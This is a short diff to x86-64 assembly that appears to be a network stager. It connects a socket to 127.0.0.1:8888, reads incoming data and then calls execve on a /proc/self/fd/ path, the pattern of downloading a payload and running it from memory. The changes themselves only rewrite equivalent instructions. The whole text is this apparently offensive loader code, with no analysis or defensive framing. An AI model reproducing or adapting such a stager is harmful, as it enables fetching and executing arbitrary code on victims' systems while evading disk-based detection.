@@ -14,18 +14,18 @@ _start:
 	syscall
 
 	; connect(sockfd, {sa_family=AF_INET, sin_port=htons(8888), sin_addr=inet_addr("127.0.0.1")}, 16)
-	xchg RDI, RAX
+	mov RDI, RAX ; RDI = sockfd
+	mov RAX, 0x2a
 	mov RCX, 0x100007fb8220002
 	push RCX
 	mov RSI, RSP
 	mov RDX, 0x10
-	mov RAX, 0x2a
 	syscall
 
 	; read(sockfd, "", 4)
 	mov RDX, 8
-	push 0x0
-	lea RSI, [RSP]
+	push 0
+	mov RSI, RSP
 	xor RAX, RAX
 	syscall
 
@@ -113,7 +113,7 @@ convert_loop:
 
 	; execve(/proc/self/fd/..., [], [])
 	mov RAX, 0x3b
-	lea RDI, [RSP]
+	mov RDI, RSP
 	xor RDX, RDX
 	push rdx
 	push rdi
